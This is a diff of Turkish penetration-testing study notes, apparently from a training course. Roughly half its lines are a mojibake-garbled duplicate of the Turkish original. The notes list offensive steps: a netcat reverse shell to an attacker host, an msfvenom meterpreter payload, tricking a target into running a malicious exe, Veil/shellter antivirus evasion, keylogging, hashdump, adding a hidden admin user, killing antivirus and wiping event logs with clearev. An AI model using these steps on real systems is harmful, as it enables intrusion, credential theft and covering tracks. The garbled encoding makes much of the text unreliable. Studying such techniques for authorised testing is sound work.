 --------------------------------------------------------------------------------------------------------------------------------------------------
-Exploit denemeleri yap.Önemli
+Exploit denemeleri yap.Ã–nemli
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 Rverse Shell
 vuherable gidiyoruz= nc attackker 80 -e /bin/sh attacker = nc -i -p 80
-dışardan içeriye 80 vs 443 açık firewall dan dolayı açtıgımız porta gidemeyebiliriz.
-meterpreter dışarı çıkar bilgiyi bize getirir.çıkarken firewall sormaz.
+dÄ±ÅŸardan iÃ§eriye 80 vs 443 aÃ§Ä±k firewall dan dolayÄ± aÃ§tÄ±gÄ±mÄ±z porta gidemeyebiliriz.
+meterpreter dÄ±ÅŸarÄ± Ã§Ä±kar bilgiyi bize getirir.Ã§Ä±karken firewall sormaz.
 nc vulnerable 6667        -------------------------------
 nc -l -p 6667 -e /bin/sh  -------------------------------
 ---------------------------------------------------------
-direkt baglantı şansı yok = bind/sh = pivoting = network zıplama.
+direkt baglantÄ± ÅŸansÄ± yok = bind/sh = pivoting = network zÄ±plama.
 ---------------------------------------------------------------------------------------------------------------------------
-msfvenom kullanımını ögren = araştır.
+msfvenom kullanÄ±mÄ±nÄ± Ã¶gren = araÅŸtÄ±r.
 her zaman bir zafiyet kullanamya gerek yok exploit kullanmaya her aman gerek yok.
-bir exe üretip bir shell istyebilriz. ayrı bir zararlı yazılım oluşturuyoruz.
-bir zararlı dosya ürettik hangi sisteme bulaştıracagız bulaştıgı sistemde 5555 ortunu açıcak
-bir web server açıyoruz.start ile başlatıyoruz yani. 5555
-bir tane dinleyici açıyoruz (bind nedir neden önemlidir.öögren)
-run diyerek çalıştırıyoruz
-5555 portuna direk istek atıyor.
-bu işlemi yaparken herhangi bir zafiyet yok.kandırma üsülü ile içeriye bir zararlı yazılım gönderdik.
-karşı tarafa bir exe gönderip onun çalışmasını ve karşımıza shell in gelmesini beklicez.
+bir exe Ã¼retip bir shell istyebilriz. ayrÄ± bir zararlÄ± yazÄ±lÄ±m oluÅŸturuyoruz.
+bir zararlÄ± dosya Ã¼rettik hangi sisteme bulaÅŸtÄ±racagÄ±z bulaÅŸtÄ±gÄ± sistemde 5555 ortunu aÃ§Ä±cak
+bir web server aÃ§Ä±yoruz.start ile baÅŸlatÄ±yoruz yani. 5555
+bir tane dinleyici aÃ§Ä±yoruz (bind nedir neden Ã¶nemlidir.Ã¶Ã¶gren)
+run diyerek Ã§alÄ±ÅŸtÄ±rÄ±yoruz
+5555 portuna direk istek atÄ±yor.
+bu iÅŸlemi yaparken herhangi bir zafiyet yok.kandÄ±rma Ã¼sÃ¼lÃ¼ ile iÃ§eriye bir zararlÄ± yazÄ±lÄ±m gÃ¶nderdik.
+karÅŸÄ± tarafa bir exe gÃ¶nderip onun Ã§alÄ±ÅŸmasÄ±nÄ± ve karÅŸÄ±mÄ±za shell in gelmesini beklicez.
 -------------------------------------------------------------------------------------------------
-Antivirüs atlatma aracları =
+AntivirÃ¼s atlatma araclarÄ± =
 --------------------------------------------------------------------------------------------------
-Veil-Evasion Payload ayarları =
-Veil-Evasion Payload üretme=
-Virustotal taraması=
+Veil-Evasion Payload ayarlarÄ± =
+Veil-Evasion Payload Ã¼retme=
+Virustotal taramasÄ±=
 shellter=
-yukardakiler hakkında video izleyerek gerekli bilgiyi ögrenebilirim.
+yukardakiler hakkÄ±nda video izleyerek gerekli bilgiyi Ã¶grenebilirim.
 ----------------------------------------------------------------------------------------------------------------
-Post exploit aşaması (asıl mesele)(Önemli)
+Post exploit aÅŸamasÄ± (asÄ±l mesele)(Ã–nemli)
 -------------------------------------------------------------------------------------------------------------------------
-active directory = biz bir sürü windows sistemi tek merkezden yönebiliyoruz
-bütün katmanlarda windows kullananlar var.sorun çıktıkça üst kata çıkılır.
-hem sistemlerin hem de grupların yönetilmesi gerçekleştirilsin(windows a çalışan yönetim) araştır
+active directory = biz bir sÃ¼rÃ¼ windows sistemi tek merkezden yÃ¶nebiliyoruz
+bÃ¼tÃ¼n katmanlarda windows kullananlar var.sorun Ã§Ä±ktÄ±kÃ§a Ã¼st kata Ã§Ä±kÄ±lÄ±r.
+hem sistemlerin hem de gruplarÄ±n yÃ¶netilmesi gerÃ§ekleÅŸtirilsin(windows a Ã§alÄ±ÅŸan yÃ¶netim) araÅŸtÄ±r
 ---------------------------------------------------------------------------------------------------------------------------
-Domain exploitation = ana hedef domaini ele geçirme, amaç domain admin olmak.
-*(dip not=rat teknolojisi kullanmayı ögren,Kullanılış bir sistem)*
-agdaki tüm cigaları tespit etme
-etki alanındaki sistemlerin tespiti
-şifrelerin hashlerinin elde edilmesi
-Şifrelerin tüm networkte denemnmesi
-Domain kullancına ait oturumların tespiti
+Domain exploitation = ana hedef domaini ele geÃ§irme, amaÃ§ domain admin olmak.
+*(dip not=rat teknolojisi kullanmayÄ± Ã¶gren,KullanÄ±lÄ±ÅŸ bir sistem)*
+agdaki tÃ¼m cigalarÄ± tespit etme
+etki alanÄ±ndaki sistemlerin tespiti
+ÅŸifrelerin hashlerinin elde edilmesi
+Åifrelerin tÃ¼m networkte denemnmesi
+Domain kullancÄ±na ait oturumlarÄ±n tespiti
 ---------------------------
-Cihazlara girerken zafiyetler kullanılabilir.
-bruto-force yapılabilir.
-sistem içerinde ki detaylı bilgi içeren dosyalar ile ek sitemlere sızma işlemi yapılabilir.
+Cihazlara girerken zafiyetler kullanÄ±labilir.
+bruto-force yapÄ±labilir.
+sistem iÃ§erinde ki detaylÄ± bilgi iÃ§eren dosyalar ile ek sitemlere sÄ±zma iÅŸlemi yapÄ±labilir.
 -------------------------------------------------------------------------------------------
 post exploit---meterpreter
-exploit aşaması işlemler
-| NT AUTHORTY\system = windows da et yetkili kullanıcı |
-| screenshot komutu ile ekran görüntüsü alır  adamın şifresini veya ne yaptıgını görebilirz|
+exploit aÅŸamasÄ± iÅŸlemler
+| NT AUTHORTY\system = windows da et yetkili kullanÄ±cÄ± |
+| screenshot komutu ile ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alÄ±r  adamÄ±n ÅŸifresini veya ne yaptÄ±gÄ±nÄ± gÃ¶rebilirz|
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.2 lport
-set payload (payload ayarlarını yapılandırmayı çöz iyice)
-upload komutu ile dosyayı yükleme veya gönderme yapılabilir.
+set payload (payload ayarlarÄ±nÄ± yapÄ±landÄ±rmayÄ± Ã§Ã¶z iyice)
+upload komutu ile dosyayÄ± yÃ¼kleme veya gÃ¶nderme yapÄ±labilir.
 download olarak da yapabiliriz.
-execute komutu ile karşıda ki exe programını çalıştırabiliriz.
+execute komutu ile karÅŸÄ±da ki exe programÄ±nÄ± Ã§alÄ±ÅŸtÄ±rabiliriz.
 ---------------------------------------------------------------------------------------------------------------------
-shell diyerek linux ve windows komutlarını çalıştırabiliyoruz.havalı bir isim verelim ki adam silemein mesala systemx vb gibi.
-içerde ki kullanıcımızıda adminastör grubuna ekledik.ps diyerek çalışan tüm prosesleri görebiliriz.
-sızarken ps deki proseslerin birine sızıyoruz.bu sistemde kalıcı olamayabilirz.
-lsass.exe bu proses bilgisayar kapandamadan kapanmaz bu acıdan bu proses e migres olmak taşıma bizi biraz daha güvenil bir yere gitmemizi saglar.
-ilk girişte hangi proses girebilecegimizi görebiliyorduk.
+shell diyerek linux ve windows komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rabiliyoruz.havalÄ± bir isim verelim ki adam silemein mesala systemx vb gibi.
+iÃ§erde ki kullanÄ±cÄ±mÄ±zÄ±da adminastÃ¶r grubuna ekledik.ps diyerek Ã§alÄ±ÅŸan tÃ¼m prosesleri gÃ¶rebiliriz.
+sÄ±zarken ps deki proseslerin birine sÄ±zÄ±yoruz.bu sistemde kalÄ±cÄ± olamayabilirz.
+lsass.exe bu proses bilgisayar kapandamadan kapanmaz bu acÄ±dan bu proses e migres olmak taÅŸÄ±ma bizi biraz daha gÃ¼venil bir yere gitmemizi saglar.
+ilk giriÅŸte hangi proses girebilecegimizi gÃ¶rebiliyorduk.
 ----------------------------------------------------------------------------------------------
 getsystem = diyerek direk en yetkili olunabilir. 
-getuid = user ıd lerini getirir.
-sisinfo = makinenin ismi /kullanıcı
+getuid = user Ä±d lerini getirir.
+sisinfo = makinenin ismi /kullanÄ±cÄ±
 -----------------------------------------------------------------------------------------------------------------
 enum_firefox
 run keylogerecorder -t 20
-clearev = bütün izleri sil
+clearev = bÃ¼tÃ¼n izleri sil
 run event_manager -c =
 killav 
 run get_application_list
-Meterpreter komut ve parametleri hakkında ayrıntılı bilgi edin.
-kalıcılıgı saglamak amaç.arka tarafta bir kullanıcı ekledim adminastor grubuna ekledik
-faydalandıgımız zafiyet yamanlandı. o zaman psexec powershell üzerinden işlem yaptrma yapabiliriz.
+Meterpreter komut ve parametleri hakkÄ±nda ayrÄ±ntÄ±lÄ± bilgi edin.
+kalÄ±cÄ±lÄ±gÄ± saglamak amaÃ§.arka tarafta bir kullanÄ±cÄ± ekledim adminastor grubuna ekledik
+faydalandÄ±gÄ±mÄ±z zafiyet yamanlandÄ±. o zaman psexec powershell Ã¼zerinden iÅŸlem yaptrma yapabiliriz.
 set SMBuser KULLANICIADI
-set SMBPass Şifre
-sessions ile bilgileri göreriz.
-persistence = komutu hakkında bilgi edin.
-hashdump = paralo hash ı kabul eder. paralo gibi
-service -p 455 -R remote hosta otamatik olarak 455 portlarını ekle
-hedef sistemden 10.0.1.7 den domain kontrol makinesine atladık.
-lab ortamını geliştirme ögren (çok çok çok çok çok çok önemli)
-domaine üye tüm sistemlere erişebilir hale geldik.
+set SMBPass Åifre
+sessions ile bilgileri gÃ¶reriz.
+persistence = komutu hakkÄ±nda bilgi edin.
+hashdump = paralo hash Ä± kabul eder. paralo gibi
+service -p 455 -R remote hosta otamatik olarak 455 portlarÄ±nÄ± ekle
+hedef sistemden 10.0.1.7 den domain kontrol makinesine atladÄ±k.
+lab ortamÄ±nÄ± geliÅŸtirme Ã¶gren (Ã§ok Ã§ok Ã§ok Ã§ok Ã§ok Ã§ok Ã¶nemli)
+domaine Ã¼ye tÃ¼m sistemlere eriÅŸebilir hale geldik.
 getpid=
-lsaax e taşı prosessi migrate i ile geiştir.
-screenshot a vncinject ile  giderbilirz.(ama çalışmadı bir hata oldu)
-set PAYLOAD windows içinden resim olarak bir yere kaydetip çekmeyi denedik
+lsaax e taÅŸÄ± prosessi migrate i ile geiÅŸtir.
+screenshot a vncinject ile  giderbilirz.(ama Ã§alÄ±ÅŸmadÄ± bir hata oldu)
+set PAYLOAD windows iÃ§inden resim olarak bir yere kaydetip Ã§ekmeyi denedik
 set Payload windows vncinject sonra run(burdaki kod tam degil)
-vncviewer = komutu. destop yok sa bu kullanılır
-yetkili kişiye işlem yaptırmıyorsa proses hatası vardır.ama erişm saglamak istiyoruz
-payload olarak vncinject  = inject edip arayüze baglantı saglayabiliriz o şekildede görübiliriz
-zaman olmadıgı için bıraktık.
+vncviewer = komutu. destop yok sa bu kullanÄ±lÄ±r
+yetkili kiÅŸiye iÅŸlem yaptÄ±rmÄ±yorsa proses hatasÄ± vardÄ±r.ama eriÅŸm saglamak istiyoruz
+payload olarak vncinject  = inject edip arayÃ¼ze baglantÄ± saglayabiliriz o ÅŸekildede gÃ¶rÃ¼biliriz
+zaman olmadÄ±gÄ± iÃ§in bÄ±raktÄ±k.
 ----------------------------------------------------------------------------------------
 
 --------------------------------------------------------------------------------------------------------------
